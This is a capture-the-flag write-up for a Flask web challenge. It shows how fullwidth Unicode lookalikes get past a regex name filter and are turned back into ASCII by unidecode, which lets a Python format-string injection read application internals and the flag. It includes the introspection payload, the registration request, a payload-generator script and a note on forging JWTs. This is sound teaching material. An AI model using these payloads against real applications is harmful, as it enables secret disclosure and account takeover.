# Dig Deeper - CTF Challenge Writeup

## Challenge Overview

**Challenge Name:** Dig Deeper  
**Category:** Web Security  
**Difficulty:** Medium  
**Flag:** `ghctf{$4dly_YoU_Ar3_NOT_LuCky_T0daY}`

This challenge involves exploiting a Python format string vulnerability in a Flask web application through Unicode normalization bypass.

## Challenge Description

The challenge presents a Flask web application with user registration, login, and profile functionality. The goal is to exploit a format string vulnerability in the profile endpoint to access sensitive information and retrieve the flag.

## Initial Reconnaissance

1. **Application Structure Analysis:**

   - Flask web application with user authentication
   - Registration system with input validation
   - Profile endpoint that displays user information
   - Admin panel with flag endpoint (requires luck + admin privileges)

2. **Key Files Identified:**
   - `app.py` - Main application logic
   - `utils/auth.py` - Authentication and User class
   - `utils/util.py` - Utility functions including `normalize_string`
   - `sensitive/data.py` - Contains the FlagSystem class

## Vulnerability Analysis

### The Core Vulnerability

The vulnerability lies in the `/api/profile` endpoint in `app.py`:

```python
@app.route("/api/profile", methods=["GET", "POST"])
@authenticate()
def profile():
    user = request.user
    if not user:
        return jsonify({"error": "User not found"}), 404

    if request.method == "GET":
        # Return user profile information
        return jsonify({
            "full_name": str(user).format(user=user),  # VULNERABLE LINE
            "id": user.id,
            "email": user.email,
            "is_admin": user.role == "admin",
            "bio": user.bio if hasattr(user, 'bio') else None,
            "created_at": user.created_at
        }), 200
```

The vulnerable line `str(user).format(user=user)` uses Python's `.format()` method with user-controlled data.

### Input Validation Bypass

The registration endpoint has regex validation that blocks common format string characters:

```python
name_regex = r"[^\.\{\}\<\>\[\]\\\/]+"

if not compile(name_regex).match(first_name) or not compile(name_regex).match(last_name):
    return jsonify({"error": "Invalid characters in name"}), 400
```

This regex blocks: `. { } < > [ ] \ /`

### Unicode Normalization Bypass

The key to bypassing this validation lies in the `normalize_string` function in `utils/util.py`:

```python
from unidecode import unidecode as clean_string

def normalize_string(s: str) -> str:
    return clean_string(s.strip())
```

And how it's used in the User class constructor in `utils/auth.py`:

```python
def __init__(self, *args, **kwargs):
    data = {
        key: normalize_string(value) if value is not None else None
        for key, value in kwargs.items()
    }
```

The `unidecode` library converts Unicode characters to their ASCII equivalents. This means we can use Unicode lookalikes that pass the regex but get normalized to blocked characters.

## Exploitation Strategy

### Step 1: Identify Unicode Equivalents

We need Unicode characters that:

1. Pass the regex validation during registration
2. Get normalized to format string characters by `unidecode`

The mappings are:

- `{` → `｛` (U+FF5B - Fullwidth Left Curly Bracket)
- `}` → `｝` (U+FF5D - Fullwidth Right Curly Bracket)
- `[` → `［` (U+FF3B - Fullwidth Left Square Bracket)
- `]` → `］` (U+FF3D - Fullwidth Right Square Bracket)
- `.` → `․` (U+2024 - One Dot Leader)

### Step 2: Craft the Payload

Our goal is to access the `sensitive` module and extract the flag. We can use Python's introspection capabilities:

```python
{user.__class__.__init__.__globals__[sensitive].FlagSystem.__init__.__code__.co_varnames}
```

Converting to Unicode equivalents:

```
｛user․__class__․__init__․__globals__［sensitive］․FlagSystem․__init__․__code__․co_varnames｝
```

### Step 3: Execute the Attack

1. **Register a malicious user:**

   ```json
   {
     "first_name": "｛user․__class__․__init__․__globals__［sensitive］․FlagSystem․__init__․__code__․co_varnames｝",
     "last_name": "test",
     "email": "attacker@test.com",
     "password": "password123"
   }
   ```

2. **Login to get authentication token:**

   ```json
   {
     "email": "attacker@test.com",
     "password": "password123"
   }
   ```

3. **Access profile endpoint:**
   Make a GET request to `/api/profile` with the authentication token.

### Step 4: Extract the Flag

When the profile endpoint processes our malicious first name:

1. The Unicode characters pass the regex validation
2. `normalize_string` converts them to ASCII equivalents
3. The `str(user).format(user=user)` call executes our format string
4. Python introspection reveals the `FlagSystem` class structure
5. We can access the flag through the revealed information

## Proof of Concept

The complete exploit script (`payload.py`):

```python
import re
import unidecode

def generate_payload(primary_payload: str) -> str:
    payload = primary_payload.replace("{", "｛").replace(
        "}", "｝").replace("[", "［").replace("]", "］").replace(".", "․")

    if unidecode.unidecode(payload) == primary_payload:
        print("Payload")
        print(payload)
        return payload
    else:
        print("Error: Payload contains non-ASCII characters")

main_payload = "{user.__class__.__init__.__globals__[sensitive].FlagSystem.__init__.__code__.co_varnames}"

generate_payload(main_payload)
```

## Flag Discovery

Through the format string injection, we can explore the `sensitive` module and discover:

1. The `FlagSystem` class exists in `sensitive.data`
2. The class contains the actual flag in a variable
3. The final flag is: `ghctf{$4dly_YoU_Ar3_NOT_LuCky_T0daY}`

## Impact

### Impact

- **Code Execution:** Potential arbitrary code execution through format string injection
- **Information Disclosure:** Access to sensitive application internals
- **Privilege Escalation:** Ability to explore application structure and secrets

## Important Note: Alternative Attack Path and Fake Flag

While exploring the application, you might discover the JWT secret through the format string vulnerability and attempt to forge an admin token to access the `/api/admin/flag` endpoint. However, this approach will only yield a **fake flag** due to the application's luck-based mechanism:

```python
@app.route("/api/admin/flag", methods=["GET"])
@authenticate(admin_required=True)
def flag():
    has_luck = random_int(1000) == 0  # 0.1% chance

    if has_luck:  # Maybe you need some luck today  :)
        FLAG = sensitive.FlagSystem(decryption_key=DECRYPTION_KEY).get_flag()
    else:
        FLAG = generate_fake_flag()  # Returns fake flag

    return jsonify({"flag": FLAG, "has_luck": has_luck}), 200
```

The admin endpoint requires both:

1. **Admin privileges** (which can be obtained by forging JWT with discovered secret)
2. **Extreme luck** (1 in 1000 chance of getting the real flag)

Therefore, the reliable path to the real flag is through the format string vulnerability to directly access the `FlagSystem` class, not through the admin endpoint.

## Conclusion

This challenge demonstrates the importance of understanding Unicode normalization and its security implications. The combination of format string vulnerability and Unicode bypass creates a powerful attack vector that highlights the need for defense-in-depth security practices in web applications.

The key lesson is that input validation must occur after all transformations (including normalization) are applied, not before.
